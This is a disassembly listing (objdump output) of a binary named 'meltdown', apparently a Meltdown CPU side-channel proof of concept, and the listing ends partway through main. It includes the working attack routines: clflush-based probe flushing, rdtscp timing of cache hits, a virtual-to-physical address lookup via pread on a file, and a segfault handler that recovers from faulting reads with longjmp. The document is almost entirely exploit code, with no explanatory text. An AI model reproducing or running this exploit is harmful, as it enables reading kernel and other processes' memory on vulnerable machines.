
meltdown:     file format elf64-x86-64


Disassembly of section .init:

0000000000000878 <_init>:
 878:	48 83 ec 08          	sub    $0x8,%rsp
 87c:	48 8b 05 65 17 20 00 	mov    0x201765(%rip),%rax        # 201fe8 <__gmon_start__>
 883:	48 85 c0             	test   %rax,%rax
 886:	74 02                	je     88a <_init+0x12>
 888:	ff d0                	callq  *%rax
 88a:	48 83 c4 08          	add    $0x8,%rsp
 88e:	c3                   	retq   

Disassembly of section .plt:

0000000000000890 <.plt>:
 890:	ff 35 b2 16 20 00    	pushq  0x2016b2(%rip)        # 201f48 <_GLOBAL_OFFSET_TABLE_+0x8>
 896:	ff 25 b4 16 20 00    	jmpq   *0x2016b4(%rip)        # 201f50 <_GLOBAL_OFFSET_TABLE_+0x10>
 89c:	0f 1f 40 00          	nopl   0x0(%rax)

00000000000008a0 <sigprocmask@plt>:
 8a0:	ff 25 b2 16 20 00    	jmpq   *0x2016b2(%rip)        # 201f58 <sigprocmask@GLIBC_2.2.5>
 8a6:	68 00 00 00 00       	pushq  $0x0
 8ab:	e9 e0 ff ff ff       	jmpq   890 <.plt>

00000000000008b0 <free@plt>:
 8b0:	ff 25 aa 16 20 00    	jmpq   *0x2016aa(%rip)        # 201f60 <free@GLIBC_2.2.5>
 8b6:	68 01 00 00 00       	pushq  $0x1
 8bb:	e9 d0 ff ff ff       	jmpq   890 <.plt>

00000000000008c0 <puts@plt>:
 8c0:	ff 25 a2 16 20 00    	jmpq   *0x2016a2(%rip)        # 201f68 <puts@GLIBC_2.2.5>
 8c6:	68 02 00 00 00       	pushq  $0x2
 8cb:	e9 c0 ff ff ff       	jmpq   890 <.plt>

00000000000008d0 <__stack_chk_fail@plt>:
 8d0:	ff 25 9a 16 20 00    	jmpq   *0x20169a(%rip)        # 201f70 <__stack_chk_fail@GLIBC_2.4>
 8d6:	68 03 00 00 00       	pushq  $0x3
 8db:	e9 b0 ff ff ff       	jmpq   890 <.plt>

00000000000008e0 <printf@plt>:
 8e0:	ff 25 92 16 20 00    	jmpq   *0x201692(%rip)        # 201f78 <printf@GLIBC_2.2.5>
 8e6:	68 04 00 00 00       	pushq  $0x4
 8eb:	e9 a0 ff ff ff       	jmpq   890 <.plt>

00000000000008f0 <__assert_fail@plt>:
 8f0:	ff 25 8a 16 20 00    	jmpq   *0x20168a(%rip)        # 201f80 <__assert_fail@GLIBC_2.2.5>
 8f6:	68 05 00 00 00       	pushq  $0x5
 8fb:	e9 90 ff ff ff       	jmpq   890 <.plt>

0000000000000900 <_setjmp@plt>:
 900:	ff 25 82 16 20 00    	jmpq   *0x201682(%rip)        # 201f88 <_setjmp@GLIBC_2.2.5>
 906:	68 06 00 00 00       	pushq  $0x6
 90b:	e9 80 ff ff ff       	jmpq   890 <.plt>

0000000000000910 <signal@plt>:
 910:	ff 25 7a 16 20 00    	jmpq   *0x20167a(%rip)        # 201f90 <signal@GLIBC_2.2.5>
 916:	68 07 00 00 00       	pushq  $0x7
 91b:	e9 70 ff ff ff       	jmpq   890 <.plt>

0000000000000920 <sigemptyset@plt>:
 920:	ff 25 72 16 20 00    	jmpq   *0x201672(%rip)        # 201f98 <sigemptyset@GLIBC_2.2.5>
 926:	68 08 00 00 00       	pushq  $0x8
 92b:	e9 60 ff ff ff       	jmpq   890 <.plt>

0000000000000930 <memalign@plt>:
 930:	ff 25 6a 16 20 00    	jmpq   *0x20166a(%rip)        # 201fa0 <memalign@GLIBC_2.2.5>
 936:	68 09 00 00 00       	pushq  $0x9
 93b:	e9 50 ff ff ff       	jmpq   890 <.plt>

0000000000000940 <malloc@plt>:
 940:	ff 25 62 16 20 00    	jmpq   *0x201662(%rip)        # 201fa8 <malloc@GLIBC_2.2.5>
 946:	68 0a 00 00 00       	pushq  $0xa
 94b:	e9 40 ff ff ff       	jmpq   890 <.plt>

0000000000000950 <longjmp@plt>:
 950:	ff 25 5a 16 20 00    	jmpq   *0x20165a(%rip)        # 201fb0 <longjmp@GLIBC_2.2.5>
 956:	68 0b 00 00 00       	pushq  $0xb
 95b:	e9 30 ff ff ff       	jmpq   890 <.plt>

0000000000000960 <open@plt>:
 960:	ff 25 52 16 20 00    	jmpq   *0x201652(%rip)        # 201fb8 <open@GLIBC_2.2.5>
 966:	68 0c 00 00 00       	pushq  $0xc
 96b:	e9 20 ff ff ff       	jmpq   890 <.plt>

0000000000000970 <atoi@plt>:
 970:	ff 25 4a 16 20 00    	jmpq   *0x20164a(%rip)        # 201fc0 <atoi@GLIBC_2.2.5>
 976:	68 0d 00 00 00       	pushq  $0xd
 97b:	e9 10 ff ff ff       	jmpq   890 <.plt>

0000000000000980 <pread@plt>:
 980:	ff 25 42 16 20 00    	jmpq   *0x201642(%rip)        # 201fc8 <pread@GLIBC_2.2.5>
 986:	68 0e 00 00 00       	pushq  $0xe
 98b:	e9 00 ff ff ff       	jmpq   890 <.plt>

0000000000000990 <sigaddset@plt>:
 990:	ff 25 3a 16 20 00    	jmpq   *0x20163a(%rip)        # 201fd0 <sigaddset@GLIBC_2.2.5>
 996:	68 0f 00 00 00       	pushq  $0xf
 99b:	e9 f0 fe ff ff       	jmpq   890 <.plt>

Disassembly of section .plt.got:

00000000000009a0 <__cxa_finalize@plt>:
 9a0:	ff 25 52 16 20 00    	jmpq   *0x201652(%rip)        # 201ff8 <__cxa_finalize@GLIBC_2.2.5>
 9a6:	66 90                	xchg   %ax,%ax

Disassembly of section .text:

00000000000009b0 <_start>:
     9b0:	31 ed                	xor    %ebp,%ebp
     9b2:	49 89 d1             	mov    %rdx,%r9
     9b5:	5e                   	pop    %rsi
     9b6:	48 89 e2             	mov    %rsp,%rdx
     9b9:	48 83 e4 f0          	and    $0xfffffffffffffff0,%rsp
     9bd:	50                   	push   %rax
     9be:	54                   	push   %rsp
     9bf:	4c 8d 05 aa 0e 00 00 	lea    0xeaa(%rip),%r8        # 1870 <__libc_csu_fini>
     9c6:	48 8d 0d 33 0e 00 00 	lea    0xe33(%rip),%rcx        # 1800 <__libc_csu_init>
     9cd:	48 8d 3d 30 05 00 00 	lea    0x530(%rip),%rdi        # f04 <main>
     9d4:	ff 15 06 16 20 00    	callq  *0x201606(%rip)        # 201fe0 <__libc_start_main@GLIBC_2.2.5>
     9da:	f4                   	hlt    
     9db:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)

00000000000009e0 <deregister_tm_clones>:
     9e0:	48 8d 3d 29 16 20 00 	lea    0x201629(%rip),%rdi        # 202010 <__TMC_END__>
     9e7:	55                   	push   %rbp
     9e8:	48 8d 05 21 16 20 00 	lea    0x201621(%rip),%rax        # 202010 <__TMC_END__>
     9ef:	48 39 f8             	cmp    %rdi,%rax
     9f2:	48 89 e5             	mov    %rsp,%rbp
     9f5:	74 19                	je     a10 <deregister_tm_clones+0x30>
     9f7:	48 8b 05 da 15 20 00 	mov    0x2015da(%rip),%rax        # 201fd8 <_ITM_deregisterTMCloneTable>
     9fe:	48 85 c0             	test   %rax,%rax
     a01:	74 0d                	je     a10 <deregister_tm_clones+0x30>
     a03:	5d                   	pop    %rbp
     a04:	ff e0                	jmpq   *%rax
     a06:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
     a0d:	00 00 00 
     a10:	5d                   	pop    %rbp
     a11:	c3                   	retq   
     a12:	0f 1f 40 00          	nopl   0x0(%rax)
     a16:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
     a1d:	00 00 00 

0000000000000a20 <register_tm_clones>:
     a20:	48 8d 3d e9 15 20 00 	lea    0x2015e9(%rip),%rdi        # 202010 <__TMC_END__>
     a27:	48 8d 35 e2 15 20 00 	lea    0x2015e2(%rip),%rsi        # 202010 <__TMC_END__>
     a2e:	55                   	push   %rbp
     a2f:	48 29 fe             	sub    %rdi,%rsi
     a32:	48 89 e5             	mov    %rsp,%rbp
     a35:	48 c1 fe 03          	sar    $0x3,%rsi
     a39:	48 89 f0             	mov    %rsi,%rax
     a3c:	48 c1 e8 3f          	shr    $0x3f,%rax
     a40:	48 01 c6             	add    %rax,%rsi
     a43:	48 d1 fe             	sar    %rsi
     a46:	74 18                	je     a60 <register_tm_clones+0x40>
     a48:	48 8b 05 a1 15 20 00 	mov    0x2015a1(%rip),%rax        # 201ff0 <_ITM_registerTMCloneTable>
     a4f:	48 85 c0             	test   %rax,%rax
     a52:	74 0c                	je     a60 <register_tm_clones+0x40>
     a54:	5d                   	pop    %rbp
     a55:	ff e0                	jmpq   *%rax
     a57:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
     a5e:	00 00 
     a60:	5d                   	pop    %rbp
     a61:	c3                   	retq   
     a62:	0f 1f 40 00          	nopl   0x0(%rax)
     a66:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
     a6d:	00 00 00 

0000000000000a70 <__do_global_dtors_aux>:
     a70:	80 3d a9 15 20 00 00 	cmpb   $0x0,0x2015a9(%rip)        # 202020 <completed.7697>
     a77:	75 2f                	jne    aa8 <__do_global_dtors_aux+0x38>
     a79:	48 83 3d 77 15 20 00 	cmpq   $0x0,0x201577(%rip)        # 201ff8 <__cxa_finalize@GLIBC_2.2.5>
     a80:	00 
     a81:	55                   	push   %rbp
     a82:	48 89 e5             	mov    %rsp,%rbp
     a85:	74 0c                	je     a93 <__do_global_dtors_aux+0x23>
     a87:	48 8b 3d 7a 15 20 00 	mov    0x20157a(%rip),%rdi        # 202008 <__dso_handle>
     a8e:	e8 0d ff ff ff       	callq  9a0 <__cxa_finalize@plt>
     a93:	e8 48 ff ff ff       	callq  9e0 <deregister_tm_clones>
     a98:	c6 05 81 15 20 00 01 	movb   $0x1,0x201581(%rip)        # 202020 <completed.7697>
     a9f:	5d                   	pop    %rbp
     aa0:	c3                   	retq   
     aa1:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
     aa8:	f3 c3                	repz retq 
     aaa:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)

0000000000000ab0 <frame_dummy>:
     ab0:	55                   	push   %rbp
     ab1:	48 89 e5             	mov    %rsp,%rbp
     ab4:	5d                   	pop    %rbp
     ab5:	e9 66 ff ff ff       	jmpq   a20 <register_tm_clones>

0000000000000aba <l1_init_LL>:
     aba:	55                   	push   %rbp
     abb:	48 89 e5             	mov    %rsp,%rbp
     abe:	48 89 7d e8          	mov    %rdi,-0x18(%rbp)
     ac2:	89 f0                	mov    %esi,%eax
     ac4:	88 45 e4             	mov    %al,-0x1c(%rbp)
     ac7:	c7 45 f8 00 00 00 00 	movl   $0x0,-0x8(%rbp)
     ace:	eb 68                	jmp    b38 <l1_init_LL+0x7e>
     ad0:	8b 45 f8             	mov    -0x8(%rbp),%eax
     ad3:	83 c0 01             	add    $0x1,%eax
     ad6:	c1 e0 0c             	shl    $0xc,%eax
     ad9:	8d 50 07             	lea    0x7(%rax),%edx
     adc:	85 c0                	test   %eax,%eax
     ade:	0f 48 c2             	cmovs  %edx,%eax
     ae1:	c1 f8 03             	sar    $0x3,%eax
     ae4:	89 c2                	mov    %eax,%edx
     ae6:	0f b6 45 e4          	movzbl -0x1c(%rbp),%eax
     aea:	c1 e0 03             	shl    $0x3,%eax
     aed:	01 d0                	add    %edx,%eax
     aef:	48 98                	cltq   
     af1:	48 8d 14 c5 00 00 00 	lea    0x0(,%rax,8),%rdx
     af8:	00 
     af9:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
     afd:	48 8d 0c 02          	lea    (%rdx,%rax,1),%rcx
     b01:	8b 45 f8             	mov    -0x8(%rbp),%eax
     b04:	c1 e0 0c             	shl    $0xc,%eax
     b07:	8d 50 07             	lea    0x7(%rax),%edx
     b0a:	85 c0                	test   %eax,%eax
     b0c:	0f 48 c2             	cmovs  %edx,%eax
     b0f:	c1 f8 03             	sar    $0x3,%eax
     b12:	89 c2                	mov    %eax,%edx
     b14:	0f b6 45 e4          	movzbl -0x1c(%rbp),%eax
     b18:	c1 e0 03             	shl    $0x3,%eax
     b1b:	01 d0                	add    %edx,%eax
     b1d:	48 98                	cltq   
     b1f:	48 8d 14 c5 00 00 00 	lea    0x0(,%rax,8),%rdx
     b26:	00 
     b27:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
     b2b:	48 01 d0             	add    %rdx,%rax
     b2e:	48 89 ca             	mov    %rcx,%rdx
     b31:	48 89 10             	mov    %rdx,(%rax)
     b34:	83 45 f8 01          	addl   $0x1,-0x8(%rbp)
     b38:	83 7d f8 06          	cmpl   $0x6,-0x8(%rbp)
     b3c:	7e 92                	jle    ad0 <l1_init_LL+0x16>
     b3e:	c7 45 fc 09 00 00 00 	movl   $0x9,-0x4(%rbp)
     b45:	eb 70                	jmp    bb7 <l1_init_LL+0xfd>
     b47:	8b 45 fc             	mov    -0x4(%rbp),%eax
     b4a:	83 e8 01             	sub    $0x1,%eax
     b4d:	c1 e0 0c             	shl    $0xc,%eax
     b50:	8d 50 07             	lea    0x7(%rax),%edx
     b53:	85 c0                	test   %eax,%eax
     b55:	0f 48 c2             	cmovs  %edx,%eax
     b58:	c1 f8 03             	sar    $0x3,%eax
     b5b:	89 c2                	mov    %eax,%edx
     b5d:	0f b6 45 e4          	movzbl -0x1c(%rbp),%eax
     b61:	c1 e0 03             	shl    $0x3,%eax
     b64:	01 d0                	add    %edx,%eax
     b66:	48 98                	cltq   
     b68:	48 83 c0 01          	add    $0x1,%rax
     b6c:	48 8d 14 c5 00 00 00 	lea    0x0(,%rax,8),%rdx
     b73:	00 
     b74:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
     b78:	48 8d 0c 02          	lea    (%rdx,%rax,1),%rcx
     b7c:	8b 45 fc             	mov    -0x4(%rbp),%eax
     b7f:	c1 e0 0c             	shl    $0xc,%eax
     b82:	8d 50 07             	lea    0x7(%rax),%edx
     b85:	85 c0                	test   %eax,%eax
     b87:	0f 48 c2             	cmovs  %edx,%eax
     b8a:	c1 f8 03             	sar    $0x3,%eax
     b8d:	89 c2                	mov    %eax,%edx
     b8f:	0f b6 45 e4          	movzbl -0x1c(%rbp),%eax
     b93:	c1 e0 03             	shl    $0x3,%eax
     b96:	01 d0                	add    %edx,%eax
     b98:	48 98                	cltq   
     b9a:	48 83 c0 01          	add    $0x1,%rax
     b9e:	48 8d 14 c5 00 00 00 	lea    0x0(,%rax,8),%rdx
     ba5:	00 
     ba6:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
     baa:	48 01 d0             	add    %rdx,%rax
     bad:	48 89 ca             	mov    %rcx,%rdx
     bb0:	48 89 10             	mov    %rdx,(%rax)
     bb3:	83 6d fc 01          	subl   $0x1,-0x4(%rbp)
     bb7:	83 7d fc 00          	cmpl   $0x0,-0x4(%rbp)
     bbb:	7f 8a                	jg     b47 <l1_init_LL+0x8d>
     bbd:	90                   	nop
     bbe:	5d                   	pop    %rbp
     bbf:	c3                   	retq   

0000000000000bc0 <get_phys_addr>:
     bc0:	55                   	push   %rbp
     bc1:	48 89 e5             	mov    %rsp,%rbp
     bc4:	48 83 ec 40          	sub    $0x40,%rsp
     bc8:	48 89 7d c8          	mov    %rdi,-0x38(%rbp)
     bcc:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax
     bd3:	00 00 
     bd5:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
     bd9:	31 c0                	xor    %eax,%eax
     bdb:	be 00 00 00 00       	mov    $0x0,%esi
     be0:	48 8d 3d a1 0c 00 00 	lea    0xca1(%rip),%rdi        # 1888 <_IO_stdin_used+0x8>
     be7:	b8 00 00 00 00       	mov    $0x0,%eax
     bec:	e8 6f fd ff ff       	callq  960 <open@plt>
     bf1:	89 45 d0             	mov    %eax,-0x30(%rbp)
     bf4:	83 7d d0 00          	cmpl   $0x0,-0x30(%rbp)
     bf8:	79 1f                	jns    c19 <get_phys_addr+0x59>
     bfa:	48 8d 0d 87 0e 00 00 	lea    0xe87(%rip),%rcx        # 1a88 <__PRETTY_FUNCTION__.4260>
     c01:	ba 14 00 00 00       	mov    $0x14,%edx
     c06:	48 8d 35 8e 0c 00 00 	lea    0xc8e(%rip),%rsi        # 189b <_IO_stdin_used+0x1b>
     c0d:	48 8d 3d 93 0c 00 00 	lea    0xc93(%rip),%rdi        # 18a7 <_IO_stdin_used+0x27>
     c14:	e8 d7 fc ff ff       	callq  8f0 <__assert_fail@plt>
     c19:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
     c1d:	48 8b 00             	mov    (%rax),%rax
     c20:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
     c24:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
     c28:	48 c7 45 d8 00 00 00 	movq   $0x0,-0x28(%rbp)
     c2f:	00 
     c30:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
     c34:	48 c1 e8 0c          	shr    $0xc,%rax
     c38:	48 c1 e0 03          	shl    $0x3,%rax
     c3c:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
     c40:	48 8b 55 e8          	mov    -0x18(%rbp),%rdx
     c44:	48 8d 75 d8          	lea    -0x28(%rbp),%rsi
     c48:	8b 45 d0             	mov    -0x30(%rbp),%eax
     c4b:	48 89 d1             	mov    %rdx,%rcx
     c4e:	ba 08 00 00 00       	mov    $0x8,%edx
     c53:	89 c7                	mov    %eax,%edi
     c55:	e8 26 fd ff ff       	callq  980 <pread@plt>
     c5a:	89 45 d4             	mov    %eax,-0x2c(%rbp)
     c5d:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
     c61:	48 c1 e0 0c          	shl    $0xc,%rax
     c65:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
     c69:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
     c6d:	48 c1 e0 0c          	shl    $0xc,%rax
     c71:	48 85 c0             	test   %rax,%rax
     c74:	75 1f                	jne    c95 <get_phys_addr+0xd5>
     c76:	48 8d 0d 0b 0e 00 00 	lea    0xe0b(%rip),%rcx        # 1a88 <__PRETTY_FUNCTION__.4260>
     c7d:	ba 1b 00 00 00       	mov    $0x1b,%edx
     c82:	48 8d 35 12 0c 00 00 	lea    0xc12(%rip),%rsi        # 189b <_IO_stdin_used+0x1b>
     c89:	48 8d 3d 1f 0c 00 00 	lea    0xc1f(%rip),%rdi        # 18af <_IO_stdin_used+0x2f>
     c90:	e8 5b fc ff ff       	callq  8f0 <__assert_fail@plt>
     c95:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
     c99:	48 c1 e0 0c          	shl    $0xc,%rax
     c9d:	48 89 c2             	mov    %rax,%rdx
     ca0:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
     ca4:	25 ff 0f 00 00       	and    $0xfff,%eax
     ca9:	48 09 d0             	or     %rdx,%rax
     cac:	48 8b 4d f8          	mov    -0x8(%rbp),%rcx
     cb0:	64 48 33 0c 25 28 00 	xor    %fs:0x28,%rcx
     cb7:	00 00 
     cb9:	74 05                	je     cc0 <get_phys_addr+0x100>
     cbb:	e8 10 fc ff ff       	callq  8d0 <__stack_chk_fail@plt>
     cc0:	c9                   	leaveq 
     cc1:	c3                   	retq   

0000000000000cc2 <unblock_signal>:
     cc2:	55                   	push   %rbp
     cc3:	48 89 e5             	mov    %rsp,%rbp
     cc6:	48 81 ec a0 00 00 00 	sub    $0xa0,%rsp
     ccd:	89 bd 6c ff ff ff    	mov    %edi,-0x94(%rbp)
     cd3:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax
     cda:	00 00 
     cdc:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
     ce0:	31 c0                	xor    %eax,%eax
     ce2:	48 8d 85 70 ff ff ff 	lea    -0x90(%rbp),%rax
     ce9:	48 89 c7             	mov    %rax,%rdi
     cec:	e8 2f fc ff ff       	callq  920 <sigemptyset@plt>
     cf1:	8b 95 6c ff ff ff    	mov    -0x94(%rbp),%edx
     cf7:	48 8d 85 70 ff ff ff 	lea    -0x90(%rbp),%rax
     cfe:	89 d6                	mov    %edx,%esi
     d00:	48 89 c7             	mov    %rax,%rdi
     d03:	e8 88 fc ff ff       	callq  990 <sigaddset@plt>
     d08:	48 8d 85 70 ff ff ff 	lea    -0x90(%rbp),%rax
     d0f:	ba 00 00 00 00       	mov    $0x0,%edx
     d14:	48 89 c6             	mov    %rax,%rsi
     d17:	bf 01 00 00 00       	mov    $0x1,%edi
     d1c:	e8 7f fb ff ff       	callq  8a0 <sigprocmask@plt>
     d21:	90                   	nop
     d22:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
     d26:	64 48 33 04 25 28 00 	xor    %fs:0x28,%rax
     d2d:	00 00 
     d2f:	74 05                	je     d36 <unblock_signal+0x74>
     d31:	e8 9a fb ff ff       	callq  8d0 <__stack_chk_fail@plt>
     d36:	c9                   	leaveq 
     d37:	c3                   	retq   

0000000000000d38 <trycatch_segfault_handler>:
     d38:	55                   	push   %rbp
     d39:	48 89 e5             	mov    %rsp,%rbp
     d3c:	48 83 ec 10          	sub    $0x10,%rsp
     d40:	89 7d fc             	mov    %edi,-0x4(%rbp)
     d43:	bf 0b 00 00 00       	mov    $0xb,%edi
     d48:	e8 75 ff ff ff       	callq  cc2 <unblock_signal>
     d4d:	bf 08 00 00 00       	mov    $0x8,%edi
     d52:	e8 6b ff ff ff       	callq  cc2 <unblock_signal>
     d57:	be 01 00 00 00       	mov    $0x1,%esi
     d5c:	48 8d 3d dd 12 20 00 	lea    0x2012dd(%rip),%rdi        # 202040 <trycatch_buf>
     d63:	e8 e8 fb ff ff       	callq  950 <longjmp@plt>

0000000000000d68 <flushprobe>:
     d68:	55                   	push   %rbp
     d69:	48 89 e5             	mov    %rsp,%rbp
     d6c:	48 89 7d e8          	mov    %rdi,-0x18(%rbp)
     d70:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%rbp)
     d77:	eb 1b                	jmp    d94 <flushprobe+0x2c>
     d79:	8b 45 fc             	mov    -0x4(%rbp),%eax
     d7c:	48 98                	cltq   
     d7e:	48 8d 14 c5 00 00 00 	lea    0x0(,%rax,8),%rdx
     d85:	00 
     d86:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
     d8a:	48 01 d0             	add    %rdx,%rax
     d8d:	0f ae 38             	clflush (%rax)
     d90:	83 45 fc 01          	addl   $0x1,-0x4(%rbp)
     d94:	81 7d fc ff ff 01 00 	cmpl   $0x1ffff,-0x4(%rbp)
     d9b:	7e dc                	jle    d79 <flushprobe+0x11>
     d9d:	90                   	nop
     d9e:	5d                   	pop    %rbp
     d9f:	c3                   	retq   

0000000000000da0 <test_flushprobe>:
     da0:	55                   	push   %rbp
     da1:	48 89 e5             	mov    %rsp,%rbp
     da4:	53                   	push   %rbx
     da5:	48 83 ec 28          	sub    $0x28,%rsp
     da9:	48 89 7d d8          	mov    %rdi,-0x28(%rbp)
     dad:	bf 00 08 00 00       	mov    $0x800,%edi
     db2:	e8 89 fb ff ff       	callq  940 <malloc@plt>
     db7:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
     dbb:	c7 45 e0 00 00 00 00 	movl   $0x0,-0x20(%rbp)
     dc2:	eb 46                	jmp    e0a <test_flushprobe+0x6a>
     dc4:	8b 45 e0             	mov    -0x20(%rbp),%eax
     dc7:	48 98                	cltq   
     dc9:	48 c1 e0 0c          	shl    $0xc,%rax
     dcd:	48 89 c2             	mov    %rax,%rdx
     dd0:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
     dd4:	48 01 d0             	add    %rdx,%rax
     dd7:	48 89 c3             	mov    %rax,%rbx
     dda:	0f ae f0             	mfence 
     ddd:	0f 01 f9             	rdtscp 
     de0:	49 89 c2             	mov    %rax,%r10
     de3:	48 8b 0b             	mov    (%rbx),%rcx
     de6:	0f 01 f9             	rdtscp 
     de9:	4c 29 d0             	sub    %r10,%rax
     dec:	48 89 c3             	mov    %rax,%rbx
     def:	8b 45 e0             	mov    -0x20(%rbp),%eax
     df2:	48 98                	cltq   
     df4:	48 8d 14 c5 00 00 00 	lea    0x0(,%rax,8),%rdx
     dfb:	00 
     dfc:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
     e00:	48 01 d0             	add    %rdx,%rax
     e03:	48 89 18             	mov    %rbx,(%rax)
     e06:	83 45 e0 01          	addl   $0x1,-0x20(%rbp)
     e0a:	81 7d e0 ff 00 00 00 	cmpl   $0xff,-0x20(%rbp)
     e11:	7e b1                	jle    dc4 <test_flushprobe+0x24>
     e13:	c7 45 e4 00 00 00 00 	movl   $0x0,-0x1c(%rbp)
     e1a:	eb 31                	jmp    e4d <test_flushprobe+0xad>
     e1c:	8b 45 e4             	mov    -0x1c(%rbp),%eax
     e1f:	48 98                	cltq   
     e21:	48 8d 14 c5 00 00 00 	lea    0x0(,%rax,8),%rdx
     e28:	00 
     e29:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
     e2d:	48 01 d0             	add    %rdx,%rax
     e30:	48 8b 10             	mov    (%rax),%rdx
     e33:	8b 45 e4             	mov    -0x1c(%rbp),%eax
     e36:	89 c6                	mov    %eax,%esi
     e38:	48 8d 3d 82 0a 00 00 	lea    0xa82(%rip),%rdi        # 18c1 <_IO_stdin_used+0x41>
     e3f:	b8 00 00 00 00       	mov    $0x0,%eax
     e44:	e8 97 fa ff ff       	callq  8e0 <printf@plt>
     e49:	83 45 e4 01          	addl   $0x1,-0x1c(%rbp)
     e4d:	81 7d e4 ff 00 00 00 	cmpl   $0xff,-0x1c(%rbp)
     e54:	7e c6                	jle    e1c <test_flushprobe+0x7c>
     e56:	90                   	nop
     e57:	48 83 c4 28          	add    $0x28,%rsp
     e5b:	5b                   	pop    %rbx
     e5c:	5d                   	pop    %rbp
     e5d:	c3                   	retq   

0000000000000e5e <prepare_probe>:
     e5e:	55                   	push   %rbp
     e5f:	48 89 e5             	mov    %rsp,%rbp
     e62:	48 83 ec 10          	sub    $0x10,%rsp
     e66:	be 00 00 10 00       	mov    $0x100000,%esi
     e6b:	bf 00 10 00 00       	mov    $0x1000,%edi
     e70:	e8 bb fa ff ff       	callq  930 <memalign@plt>
     e75:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
     e79:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%rbp)
     e80:	eb 24                	jmp    ea6 <prepare_probe+0x48>
     e82:	8b 45 f4             	mov    -0xc(%rbp),%eax
     e85:	8d 0c 00             	lea    (%rax,%rax,1),%ecx
     e88:	8b 45 f4             	mov    -0xc(%rbp),%eax
     e8b:	48 98                	cltq   
     e8d:	48 8d 14 c5 00 00 00 	lea    0x0(,%rax,8),%rdx
     e94:	00 
     e95:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
     e99:	48 01 c2             	add    %rax,%rdx
     e9c:	48 63 c1             	movslq %ecx,%rax
     e9f:	48 89 02             	mov    %rax,(%rdx)
     ea2:	83 45 f4 01          	addl   $0x1,-0xc(%rbp)
     ea6:	81 7d f4 ff ff 01 00 	cmpl   $0x1ffff,-0xc(%rbp)
     ead:	7e d3                	jle    e82 <prepare_probe+0x24>
     eaf:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
     eb3:	c9                   	leaveq 
     eb4:	c3                   	retq   

0000000000000eb5 <print_usage_message>:
     eb5:	55                   	push   %rbp
     eb6:	48 89 e5             	mov    %rsp,%rbp
     eb9:	48 8d 3d 12 0a 00 00 	lea    0xa12(%rip),%rdi        # 18d2 <_IO_stdin_used+0x52>
     ec0:	e8 fb f9 ff ff       	callq  8c0 <puts@plt>
     ec5:	48 8d 3d 24 0a 00 00 	lea    0xa24(%rip),%rdi        # 18f0 <_IO_stdin_used+0x70>
     ecc:	e8 ef f9 ff ff       	callq  8c0 <puts@plt>
     ed1:	48 8d 3d 50 0a 00 00 	lea    0xa50(%rip),%rdi        # 1928 <_IO_stdin_used+0xa8>
     ed8:	e8 e3 f9 ff ff       	callq  8c0 <puts@plt>
     edd:	48 8d 3d 64 0a 00 00 	lea    0xa64(%rip),%rdi        # 1948 <_IO_stdin_used+0xc8>
     ee4:	e8 d7 f9 ff ff       	callq  8c0 <puts@plt>
     ee9:	48 8d 3d a0 0a 00 00 	lea    0xaa0(%rip),%rdi        # 1990 <_IO_stdin_used+0x110>
     ef0:	e8 cb f9 ff ff       	callq  8c0 <puts@plt>
     ef5:	48 8d 3d da 0a 00 00 	lea    0xada(%rip),%rdi        # 19d6 <_IO_stdin_used+0x156>
     efc:	e8 bf f9 ff ff       	callq  8c0 <puts@plt>
     f01:	90                   	nop
     f02:	5d                   	pop    %rbp
     f03:	c3                   	retq   

0000000000000f04 <main>:
     f04:	55                   	push   %rbp
     f05:	48 89 e5             	mov    %rsp,%rbp
     f08:	53                   	push   %rbx
     f09:	48 81 ec d8 00 00 00 	sub    $0xd8,%rsp
     f10:	89 bd 2c ff ff ff    	mov    %edi,-0xd4(%rbp)
     f16:	48 89 b5 20 ff ff ff 	mov    %rsi,-0xe0(%rbp)
     f1d:	b8 00 00 00 00       	mov    $0x0,%eax
     f22:	e8 37 ff ff ff       	callq  e5e <prepare_probe>
     f27:	48 89 45 80          	mov    %rax,-0x80(%rbp)
     f2b:	48 8b 45 80          	mov    -0x80(%rbp),%rax
     f2f:	48 89 45 88          	mov    %rax,-0x78(%rbp)
     f33:	48 8b 45 88          	mov    -0x78(%rbp),%rax
     f37:	48 89 c7             	mov    %rax,%rdi
     f3a:	e8 29 fe ff ff       	callq  d68 <flushprobe>
     f3f:	48 8b 85 20 ff ff ff 	mov    -0xe0(%rbp),%rax
     f46:	48 83 c0 08          	add    $0x8,%rax
     f4a:	48 8b 00             	mov    (%rax),%rax
     f4d:	48 89 c7             	mov    %rax,%rdi
     f50:	e8 1b fa ff ff       	callq  970 <atoi@plt>
